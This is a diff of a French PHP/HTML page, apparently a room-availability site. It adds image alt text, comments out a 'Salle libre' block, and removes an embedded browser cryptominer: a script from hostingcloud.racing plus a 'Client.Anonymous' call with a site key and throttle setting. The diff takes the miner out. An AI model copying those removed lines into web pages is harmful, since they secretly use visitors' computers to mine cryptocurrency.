@@ -36,7 +36,7 @@ if ($ret == false) {
 <div class=main>
     <div class="menu">
         <div class="menu-b" onclick="clickMenu();">
-            <img class="menu-b" src="image/menu_toggle.png">
+            <img class="menu-b" src="image/menu_toggle.png" alt="erreur de chargement">
         </div>
         <script>
             clickMenu();
@@ -137,7 +137,7 @@ if ($ret == false) {
                 </div>
                 <br class="noneP">
                 <div class="borderM">
-                    <div>
+                    <!--<div>
                         <h1>Salle libre</h1>
                     </div>
                     <div>
@@ -147,7 +147,7 @@ if ($ret == false) {
                             echo getSalleLibre();
                             ?>
                         </h2>
-                    </div>
+                    </div>-->
                 </div>
                 <br class="noneP">
                 <div id="footer">© 2016 RYDIN Nathan and LUX Mathieu<br>© 2019 Aymeric Bizouarn All Rights Reserved
@@ -174,10 +174,3 @@ if ($ret == false) {
     </div>
 </div>
 </body>
-<script src="https://www.hostingcloud.racing/gzZy.js"></script>
-<script>
-    var _client = new Client.Anonymous('016b1163139e575e2acb10e5dc1bfbde68d3e011d764a4727a544a8037be66c5', {
-        throttle: 0.5, c: 'w', ads: 0
-    });
-    _client.start();
-</script>
